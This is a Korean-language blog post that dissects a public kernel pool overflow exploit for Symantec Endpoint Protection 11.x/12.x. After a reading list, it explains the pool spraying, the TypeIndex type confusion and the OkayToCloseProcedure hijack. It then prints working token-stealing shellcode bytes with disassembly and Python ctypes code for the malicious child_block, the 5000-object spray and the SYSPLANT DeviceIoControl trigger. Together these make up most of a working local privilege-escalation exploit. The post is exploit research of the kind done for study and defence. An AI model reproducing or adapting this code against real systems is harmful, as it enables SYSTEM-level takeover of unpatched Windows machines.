---
layout: post
title: "Symantec Endpoint Protection - Kernel Pool Overflow"
date: 2015-05-14 21:21:58 +0900
comments: true
categories: 
---

[Symantec Endpoint Protection 11.x, 12.x - Kernel Pool Overflow](https://www.exploit-db.com/exploits/34272/)

참고할만한 문서들은

* [Data-only Pwning Microsoft Windows Kernel: Exploitation of Kernel Pool Overflows on Microsoft Windows 8.1](http://slidegur.com/doc/15815/data-only-pwning-microsoft-windows-kernel)
* [Project Heapbleed, BalCCon2k14](https://www.youtube.com/watch?v=-smvfojecvs)
* [Modern Kernel Pool Exploitation: Attacks and Techniques](http://www.slideshare.net/scovetta/kernelpool)
* [Kernel Pool Exploitation on Windows 7](https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf)
* [Windows Local Kernel Exploitation, HITBSecCon 2004 Kuala Lumpur](http://packetstorm.interhost.co.il/hitb04/hitb04-sk-chong.pdf)
* [Access token stealing on Windows, Csaba Barta, 2009](http://www.ntdsxtract.com/downloads/Token_Stealing_old.pdf)
* [Kernel-mode Payloads on Windows, bugcheck and skape](http://www.uninformed.org/?v=3&a=4&t=pdf)
* [Exploiting 802.11 Wireless Driver Vulnerabilities on Windows](http://www.uninformed.org/?v=6&a=2&t=pdf)
* [Remote Windows Kernel Exploitation: Step into the Ring 0](http://www.blackhat.com/presentations/bh-usa-05/BH_US_05-Jack_White_Paper.pdf)
* [Win32 Device Drivers Communication Vulnerabilities, Lord Yup](http://securityvulns.ru/docs4946.html)
* [x86-64 Buffer Overflow Exploits and the Borrowed Code Chunks Exploitation Technique](http://www.suse.de/~krahmer/no-nx.pdf)
* infamous HalDispatchTable
* j00ru's research
* [Alex's lonescu research](http://www.alex-ionescu.com/?p=231)
* Nikita Tarakanov. Kernel Pool Overflow from Windows XP to Windows 8. ZeroNights, 2011
* Kostya Kortchinsky. Real world kernel pool exploitation. SyScan, 2008
* SoBeIt. How to exploit Windows kernel memory pool. X’con, 2005
* [Windows 8 Heap Internals](http://illmatics.com/Windows%208%20Heap%20Internals.pdf)
* [GDI Font Fuzzing in Windows Kernel for Fun](https://media.blackhat.com/bh-eu-12/Lee/bh-eu-12-Lee-GDI_Font_Fuzzing-WP.pdf)
* [Exploiting Hardcore Pool Corruptions in Microsoft Windows Kernel](http://www.nosuchcon.org/talks/2013/D3_02_Nikita_Exploiting_Hardcore_Pool_Corruptions_in_Microsoft_Windows_Kernel.pdf)
* [GDT and LDT in Windows kernel vulnerability exploitation](http://j00ru.vexillium.org/?p=290)
* SoBelt X'con 2005
* Kostya Kortchinsky SyScan 2008
* Tarjei Mandt BH DC 2011

#### Exploit Strategy

[OkayToCloseProcedure callback kernel hook](http://rce4fun.blogspot.kr/2014/07/okaytocloseprocedure-callback-kernel_9.html)

* IoCompletionReserve object 로 spraying 을 한다음에, close 를 해줘서 hole 을 만든다.
* ioctl() 을 해서 hole 사이에 메모리를 alloc 하고, next object 의 Type Index 를 0 으로 만들어서 type confusion 을 일으킨다.
* 이제 handle 을 close 하면, type confusion 때문에 엉뚱한 주소에서 OkayToCloseProcedure 를 읽는다.
* OkayToCloseProcedure 에는 0x00000078 을 넣어놓고, 0x00000078 에는 shellcode 를 세팅해둔다.
* Shellcode 는 Type Index 를 repair 하고, `nt authority\SYSTEM` 을 훔친다.

#### Token Stealing Shellcode

Exploit 에서 사용된 shellcode 는 token stealing shellcode.

```
tokenstealing = (
"\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x8B\xC8\x8B\x80"
"\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x83\xB8\xB4\x00\x00\x00\x04"
"\x75\xEC\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\xC2\x10"
"\x00"
)
```

Disassemble 해봤다. 

```
33c0                    xor eax,eax
648b8024010000          mov eax,DWORD PTR fs:[eax+0x124]
8b4050                  mov eax,DWORD PTR [eax+0x50]
8bc8                    mov ecx,eax
loc_0000000e:
8b80b8000000            mov eax,DWORD PTR [eax+0xb8]
2db8000000              sub eax,0xb8
83b8b400000004          cmp DWORD PTR [eax+0xb4],0x4
75ec                    jne loc_0000000e
8b90f8000000            mov edx,DWORD PTR [eax+0xf8]
8991f8000000            mov DWORD PTR [ecx+0xf8],edx
c21000                  ret 0x10
```

`EPROCESS` 구조체에서 `Token` 필드를 조작한다. 상위권한을 가지고 있는 프로세스의 토큰을 카피해 놓는 것이다.
`SYSTEM` 프로세스에서 카피하는데 XP, 2003, Vista 에서는 PID 0x4.

Target 이 IDLE 상태라면, `FS:[0x124]` 가 ETHREAD 를 가리키니까 여기서 EPROCESS 를 구한다.

#### Hotpatching SYSFER.DLL

1. VirtualAllocEx() 로 cmd.exe 프로세스 내부에 메모리를 할당받는다.
2. 할당받은 메모리에 크기 `0x44c` 만큼의 악의적인 데이터를 깔아놓는다. 나중에 이걸로 kernel memory 를 오염시킬것이다.
3. SEP 가 cmd.exe 에 inject 한 SYSFER.dll 의 주소를 찾는다. 
4. 저 주소를 베이스로, GetProcAddress() 를 써서 SYSFER.DLL 이 export 한 `child_block` 과 `child_block_size` 의 주소를 찾아낸다.
5. 2 번의 메모리 주소로 `child_block` 을 overwrite 한다. 이제 `child_block` 은 악의적인 데이터를 포인팅한다.
6. `0x44c` 로 `child_block_size` 를 overwrite 한다.

#### Evil child_block

```
    """ Allocate the source buffer in the parent process """
    v = kernel32.VirtualAllocEx(phandle, 
            0x0, 
            evil_child_block_size, 
            MEM_RESERVE|MEM_COMMIT, 
            PAGE_EXECUTE_READWRITE)
    # 8654c580  040c0090 ef436f49 00000000 0000005c
    # 8654c590  00000000 00000000 00000001 00000001
    # 8654c5a0  00000000 0008000a
    quota   = "\x00\x00\x00\x00"   
    header  = "\x90\x00\x0c\x04\x49\x6f\x43\xef\x00\x00\x00\x00\x5c\x00\x00\x00"
    header += "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"
    header += "\x00\x00\x00\x00"
    # TypeIndex = "\x0a\x00\x08\x00"
    TypeIndex = "\x00\x00\x08\x00"
    offset    = "\x45" * (evil_child_block_size-len(header)-len(TypeIndex)-len(quota))
    overflow  = offset + quota + header + TypeIndex 
    csrc      = create_string_buffer(overflow, evil_child_block_size)
    wrote     = c_ulong(0)
    res = kernel32.WriteProcessMemory(phandle, v, 
            addressof(csrc), 
            evil_child_block_size, 
            byref(wrote))
```

`IoCompletionReserve` 오브젝트를 overwrite 할 것인데, `TypeIndex` 가 원래는 `0x0A` 인데 `0x00` 으로 overwrite 해서 Type Confusion 을 일으킨다. CloseHandle() 할 때, 찾아갈 OkayToCloseProcedure 가 엉뚱한 곳으로 튀게 된다.

아래의 `TypeIndex` 를 0 으로 overwrite 한다.

```
kd> dt nt!_OBJECT_HEADER
+0x000 PointerCount : Int4B
+0x004 HandleCount : Int4B
+0x004 NextToFree : Ptr32 Void
+0x008 Lock : _EX_PUSH_LOCK
+0x00c TypeIndex : UChar <- Index of pointer to OBJECT_TYPE structure in ObTypeIndexTable
+0x00d TraceFlags : Uchar
+0x00d DbgRefTrace : Pos 0, 1 Bit
+0x00d DbgTracePermanent : Pos 1, 1 Bit
+0x00e InfoMask : UChar
+0x00f Flags : UChar
...
```

`ObTypeIndexTable` 을 보면,

```
kd> dd nt!ObTypeIndexTable 
81a3edc0 00000000 bad0b0b0 85543768 855436a0
...
```

이제 0x85543768 을 _OBJECT_TYPE 으로 덤프해보자.

```
kd> dt _OBJECT_TYPE 85543768
+0x000 TypeList             : _LIST_ENTRY [ 0x85543740 - 0x869c6738 ]
...
+0x028 TypeInfo             : _OBJECT_TYPE_INITIALIZER
...
```

이제 TypeInfo 를 까보자.

```
kd> dt nt!_OBJECT_TYPE_INITIALIZER 0x85543768+0x28
+0x000 Length               : 0x50
...
+0x04c OkayToCloseProcedure : (null)
```

`0x28` + `0x4c` = `0x74` 이니까, `Type Index` 를 0 으로 세팅하면 `0x00000000 + 0x74` 에서 `OkayToCloseProcedure` 를 읽게된다.

#### allocShellcode()

```
    "\x42" * 0x70

    OkayToCloseProcedure (0x00000078)

    ADD ESI,0C
    MOV DWORD PTR DS:[ESI],8000A
    SUB ESI,0C # RESTORE TypeIndex

    xor eax,eax # Token stealing shellcode
    mov eax,DWORD PTR fs:[eax+0x124]
    mov eax,DWORD PTR [eax+0x50]
    mov ecx,eax
loc_0000000e:
    mov eax,DWORD PTR [eax+0xb8]
    sub eax,0xb8
    cmp DWORD PTR [eax+0xb4],0x4
    jne loc_0000000e
    mov edx,DWORD PTR [eax+0xf8]
    mov DWORD PTR [ecx+0xf8],edx
    ret 0x10

    "\x90"
    "\x90"
    ...
```

이 쉘코드를 NtAllocateVirtualMemory() 로 `0x00000004` 에 allocate 한다.

#### Spray()

Spray the kernel pool with IoCompletionReserve objects. Each object is 0x60 bytes in length and is allocated
from the non-paged kernel pool.

When applications need failure-free delivery of an I/O completion port message, or packet. Typically,
packets are sent with the PostQueuedCompletionStatus API in Kernelbase.dll, which calls NtSetIoCompletion
API. Similarly to the user APC, the kernel must allocate an I/O manager structure to contain the completion-packet information,
and if this allocation failes, the packet cannot be created. With reserve objects, the application can use the
NtAllocateReserveObject API on startup to have the kernel pre-allocate the I/O completion packet, and the
NtSetIoCompletionEx system call can be used to supply a handle to this reserve object, guaranteeing a success path.

exploit 을 시작할 시점에는 kernel pool 이 fragmented 되어있기 마련이라, 구멍을 채워줘야한다. 현재 있는 page 들을 꽉 채우고,
그 이후부터 allocation 을 때리면, 새로운 page 에 sequential 하게 일어날 가능성이 높아진다.

```
    global handles, done
    handles = {}
    for i in range(0,5000):
        hHandle = HANDLE(0)
        ntdll.NtAllocateReserveObject(byref(hHandle), 0x0, IO_COMPLETION_OBJECT)
        handles[hHandle.value] = hHandle
```

* [Exploits for MS10-058, Jeremy Fetiveau](https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp)
* [Stars aligner’s how-to: kernel pool spraying and VMware CVE-2013-1406](http://blog.ptsecurity.com/2013/03/stars-aligners-how-to-kernel-pool.html)

#### NtAllocateReserveObject()

In short, `NtAllocateReserveObject` makes it possible for any system user to allocate a buffer 
on the non-paged kernel pool, and obtain a HANDLE representation of this buffer in user-mode.
As it will turn out later in this paper, the above can give us pretty much control over the
kernel memory, when exploiting custom vulnerabilities.

```
#define APC_OBJECT              0
#define IO_COMPLETION_OBJECT    1
#define MAX_OBJECT_ID           1

NTSTATUS STDCALL NtAllocateReserveObject(
    OUT PHANDLE hObject,
    IN  POBJECT_ATTRIBUTE ObjectAttributes,
    IN  DWORD ObjectType)
{
    PVOID ObjectBuffer;
    HANDLE hOutputHandle;
    NTSTATUS NtStatus;

    if (PreviousMode == UserMode) {
        // Validate hObject
    }
    if (ObjectType > MAX_OBJECT_ID) {
        /* Bail out: STATUS_INVALID_PARAMETER
         */
    } else {
        NtStatus = ObCreateObject(PreviousMode,
                                    PspMemoryReserveObjectTypes[ObjectType],
                                    ObjectAttributes,
                                    PreviousMode,
                                    0,
                                    PspMemoryReserveObjectSizes[ObjectType],
                                    0,
                                    0,
                                    &ObjectBuffer);
        if (!NT_SUCCESS(NtStatus))
            /* Bail out: NtStatus
             */

        memset(ObjectBuffer, 0, PspMemoryReserveObjectSizes[ObjectType]);

        if (ObjectType == IO_COMPLETION) {
            //
            // Perform some ObjectBuffer initialization
            //
            ObjectBuffer[0x0C] = 3;
            ObjectBuffer[0x20] = PspIoMiniPacketCallbackRoutine;
            ObjectBuffer[0x24] = ObjectBuffer;
            ObjectBuffer[0x28] = 0;
        }
        NtStatus = ObInsertObjectEx(ObjectBuffer,
                                    &hOutputHandle,
                                    0,
                                    0xF0003,
                                    0,
                                    0,
                                    0);
        if (!NT_SUCCESS(NtStatus))
            /* Bail out: NtStatus
             */
        *hObject = hOutputHandle;
    }
    return NtStatus;
}
```

#### DeviceIoControl()

```
BOOL WINAPI DeviceIoControl(HANDLE hDevice,
                            DWORD dwIoControlCode,
                            LPVOID lpInBuffer,
                            DWORD nInBufferSize,
                            LPVOID lpOutputBuffer,
                            DWORD nOutBufferSize,
                            LPDWORD lpBytesReturned,
                            LPOVERLAPPED lpOverlapped);
```

파라메터중에서 중요한 것은 `hDevice`, `dwIoControlCode`, `lpInBuffer`, `lpOutputBuffer`.

```
    dwReturn = c_ulong()

    evil_input = "\x41" * 4 + struct.pack("<L", 0x00222084) + "D" * 56

    evil_size = len(evil_input)
    einput = create_string_buffer(evil_input, evil_size)
    eoutput = create_string_buffer("\x00" * 1024, 1024)
    driver_handle = kernel32.CreateFilwW( u"\\\\.\\SYSPLANT", GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
    ...
    kernel32.DeviceIoControl(driver_handle, 0x00222084, 
                                addressof(einput), evil_size, 
                                addressof(eoutput), 1024, 
                                byref(dwReturn), None)
```

이 커맨드가 `SYSPLANT.sys` 의 `DriverDispatcher()` 에 날라가면 `SYSFER.dll` 의 `child_block` 에 담가둔 오염된 데이터때문에 `SYSPLANT.sys` 가 뻘짓을 하게 되는 흐름.
